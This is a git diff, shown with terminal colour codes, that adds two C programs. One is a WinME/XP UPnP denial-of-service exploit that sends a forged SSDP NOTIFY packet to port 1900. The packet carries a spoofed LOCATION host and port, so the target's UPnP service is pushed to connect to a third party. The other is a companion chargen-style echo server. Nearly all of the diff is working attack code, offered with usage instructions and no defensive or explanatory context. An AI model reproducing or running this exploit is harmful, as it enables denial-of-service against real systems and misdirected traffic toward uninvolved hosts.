[1mdiff --git a/callback_client.c b/callback_client.c[m
[1mnew file mode 100644[m
[1mindex 0000000..5da51f4[m
[1m--- /dev/null[m
[1m+++ b/callback_client.c[m
[36m@@ -0,0 +1,99 @@[m
[32m+[m[32m/*[m[41m [m
[32m+[m[32m * WinME/XP UPNP D0S[m[41m  [m
[32m+[m[32m *[m
[32m+[m[32m * ./upnp_udp <remote_hostname> <spooffed_host> <chargen_port>[m
[32m+[m[32m *[m
[32m+[m[32m * Authors:     Gabriel Maggiotti,[m[41m [m
[32m+[m[32m * Email:       gmaggiotti@gmail.com[m
[32m+[m[32m */[m
[32m+[m
[32m+[m[32m#include <stdio.h>[m
[32m+[m[32m#include <string.h>[m
[32m+[m[32m#include <stdlib.h>[m
[32m+[m[32m#include <errno.h>[m
[32m+[m[32m#include <string.h>[m
[32m+[m[32m#include <netdb.h>[m
[32m+[m[32m#include <sys/types.h>[m
[32m+[m[32m#include <netinet/in.h>[m
[32m+[m[32m#include <sys/socket.h>[m
[32m+[m[32m#include <sys/wait.h>[m
[32m+[m[32m#include <unistd.h>[m
[32m+[m[32m#include <fcntl.h>[m
[32m+[m
[32m+[m[32m#define MAX	1000[m
[32m+[m[32m#define PORT	1900[m
[32m+[m
[32m+[m
[32m+[m[32mchar *str_replace(char *rep, char *orig, char *string)[m
[32m+[m[32m{[m
[32m+[m[32mint len=strlen(orig);[m
[32m+[m[32mchar buf[MAX]="";[m
[32m+[m[32mchar *pt=strstr(string,orig);[m
[32m+[m
[32m+[m[32mstrncpy(buf,string, pt-string );[m
[32m+[m[32mstrcat(buf,rep);[m
[32m+[m[32mstrcat(buf,pt+strlen(orig));[m
[32m+[m[32mstrcpy(string,buf);[m
[32m+[m[32mreturn string;[m
[32m+[m[32m}[m
[32m+[m
[32m+[m[32m/***************************************************************************/[m
[32m+[m
[32m+[m[32mint main(int argc,char *argv[])[m
[32m+[m[32m{[m
[32m+[m	[32mint sockfd,i;[m
[32m+[m	[32mint numbytes;[m
[32m+[m	[32mint num_socks;[m
[32m+[m	[32mint addr_len;[m
[32m+[m	[32mchar recive_buffer[MAX]="";[m
[32m+[m
[32m+[m	[32mchar send_buffer[MAX]=[m
[32m+[m	[32m"NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"[m
[32m+[m	[32m"CACHE-CONTROL: max-age=1\r\nLOCATION: http://www.host.com:port/\r\n"[m
[32m+[m	[32m"NT: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n"[m
[32m+[m	[32m"NTS: ssdp:alive\r\nSERVER: QB0X/201 UPnP/1.0 prouct/1.1\r\n"[m
[32m+[m	[32m"USN: uuid:QB0X\r\n\r\n\r\n";[m
[32m+[m
[32m+[m	[32mchar *aux=send_buffer;[m
[32m+[m	[32mstruct hostent *he;[m
[32m+[m	[32mstruct sockaddr_in their_addr;[m
[32m+[m
[32m+[m	[32mif(argc!=4)[m
[32m+[m	[32m{[m
[32m+[m		[32mfprintf(stderr,"usage:%s <remote_hostname> "\[m
[32m+[m			[32m"<spooffed_host> <chargen_port>\n",argv[0]);[m
[32m+[m		[32mexit(1);[m
[32m+[m	[32m}[m
[32m+[m
[32m+[m
[32m+[m	[32maux=str_replace(argv[2],"www.host.com",send_buffer);[m
[32m+[m	[32maux=str_replace(argv[3],"port",send_buffer);[m
[32m+[m
[32m+[m	[32mif((he=gethostbyname(argv[1]))==NULL)[m
[32m+[m	[32m{[m
[32m+[m		[32mperror("gethostbyname");[m
[32m+[m		[32mexit(1);[m
[32m+[m	[32m}[m
[32m+[m
[32m+[m
[32m+[m	[32mif( (sockfd=socket(AF_INET,SOCK_DGRAM,0)) == -1) {[m
[32m+[m		[32mperror("socket"); exit(1);[m
[32m+[m	[32m}[m
[32m+[m
[32m+[m	[32mtheir_addr.sin_family=AF_INET;[m
[32m+[m	[32mtheir_addr.sin_port=htons(PORT);[m
[32m+[m	[32mtheir_addr.sin_addr=*((struct in_addr*)he->h_addr);[m
[32m+[m	[32mbzero(&(their_addr.sin_zero),8);[m
[32m+[m
[32m+[m	[32mif( (numbytes=sendto(sockfd,send_buffer,strlen(send_buffer),0,\[m
[32m+[m	[32m(struct sockaddr *)&their_addr, sizeof(struct sockaddr))) ==-1)[m
[32m+[m	[32m{[m
[32m+[m		[32mperror("send");[m
[32m+[m		[32mexit(0);[m
[32m+[m	[32m}[m
[32m+[m	[32mclose(sockfd);[m
[32m+[m
[32m+[m[32mreturn 0;[m
[32m+[m[32m}[m
[32m+[m
[32m+[m
[1mdiff --git a/chargen.c b/chargen.c[m
[1mnew file mode 100644[m
[1mindex 0000000..1f0ec23[m
[1m--- /dev/null[m
[1m+++ b/chargen.c[m
[36m@@ -0,0 +1,103 @@[m
[32m+[m[32m/*[m
[32m+[m[32m * Chargen Server[m
[32m+[m[32m *[m
[32m+[m[32m * Run: ./chargen <chargen_port>[m
[32m+[m[32m *[m
[32m+[m[32m *[m
[32m+[m[32m * Author:      Gabriel Maggiotti, Fernando Oubiña[m
[32m+[m[32m * Email:       gmaggiot@ciudad.com.ar, foubina@qb0x.net[m
[32m+[m[32m * Webpage:     http://qb0x.net[m
[32m+[m[32m */[m
[32m+[m
[32m+[m[32m#include <stdio.h>[m
[32m+[m[32m#include <stdlib.h>[m
[32m+[m[32m#include <errno.h>[m
[32m+[m[32m#include <string.h>[m
[32m+[m[32m#include <sys/types.h>[m
[32m+[m[32m#include <netinet/in.h>[m
[32m+[m[32m#include <sys/socket.h>[m
[32m+[m[32m#include <sys/wait.h>[m
[32m+[m[32m#include <malloc.h>[m
[32m+[m
[32m+[m[32m#define BACKLOG	5[m
[32m+[m[32m#define MAX	500[m
[32m+[m
[32m+[m[32mint[m
[32m+[m[32mmain(int argc, char *argv[])[m
[32m+[m[32m{[m
[32m+[m[32mint visit=1;[m
[32m+[m[32mint i;[m
[32m+[m[32mint port;[m
[32m+[m[32mint sockfd;[m
[32m+[m[32mint newfd;[m
[32m+[m[32mint numbytes;[m
[32m+[m[32mchar buf[MAX];[m
[32m+[m[32mchar diedbuf[1024];[m
[32m+[m
[32m+[m	[32mstruct sockaddr_in my_addr;[m
[32m+[m	[32mstruct sockaddr_in their_addr;[m
[32m+[m	[32mint sin_size;[m
[32m+[m
[32m+[m	[32mif(argc!=2) {[m
[32m+[m		[32mfprintf(stderr,"usage: %s <chargen_port>\n",argv[0]);[m
[32m+[m		[32mreturn 1;[m
[32m+[m	[32m}[m
[32m+[m	[32mport=atoi(argv[1]);[m
[32m+[m
[32m+[m	[32mif( (sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1)[m
[32m+[m	[32m{[m
[32m+[m		[32mperror("socket");[m
[32m+[m		[32mexit(1);[m
[32m+[m	[32m}[m
[32m+[m
[32m+[m	[32mmy_addr.sin_family=AF_INET;[m
[32m+[m	[32mmy_addr.sin_port=htons(port);[m
[32m+[m	[32mmy_addr.sin_addr.s_addr=htonl(INADDR_ANY);[m
[32m+[m	[32mbzero( &(my_addr.sin_zero),8);[m
[32m+[m
[32m+[m	[32mif( bind(sockfd, (struct sockaddr *) &my_addr,\[m
[32m+[m		[32msizeof(struct sockaddr) ) == -1)[m
[32m+[m	[32m{[m
[32m+[m		[32mperror("bind");[m
[32m+[m		[32mexit(1);[m
[32m+[m	[32m}[m
[32m+[m
[32m+[m
[32m+[m	[32mif( listen(sockfd, BACKLOG) == -1)[m
[32m+[m	[32m{[m
[32m+[m		[32mperror("listen");[m
[32m+[m		[32mexit(1);[m
[32m+[m	[32m}[m
[32m+[m
[32m+[m	[32mwhile(1)[m[41m [m
[32m+[m	[32m{[m[41m	[m
[32m+[m		[32msin_size=sizeof( struct sockaddr_in);[m
[32m+[m		[32mif( (newfd=accept(sockfd,(struct sockaddr*)&their_addr,\[m
[32m+[m			[32m &sin_size))== -1)[m
[32m+[m		[32m{[m
[32m+[m			[32mperror("accept");[m
[32m+[m			[32mexit(1);[m
[32m+[m		[32m}[m
[32m+[m		[32mprintf("Visit number: %d\n",visit++);[m
[32m+[m
[32m+[m		[32mif(!fork())[m[41m [m
[32m+[m		[32m{[m
[32m+[m			[32mint i=1;[m
[32m+[m			[32mif( (numbytes=recv(newfd,buf,MAX,0))==-1 )[m[41m [m
[32m+[m			[32m{[m
[32m+[m				[32mperror("recv");[m
[32m+[m				[32mexit(1);[m
[32m+[m			[32m}[m
[32m+[m[41m	[m
[32m+[m			[32mbuf[numbytes]='\0';[m
[32m+[m			[32mprintf("%s\n",buf);[m
[32m+[m[41m	[m
[32m+[m			[32mif(send(newfd,buf,strlen(buf),0) ==-1)[m
[32m+[m			[32m{[m
[32m+[m[41m        [m			[32mperror("send");[m
[32m+[m[41m        [m			[32mexit(0);[m
[32m+[m			[32m}[m
[32m+[m		[32m}[m
[32m+[m	[32m}[m
[32m+[m[32mclose(newfd);[m
[32m+[m[32m}[m
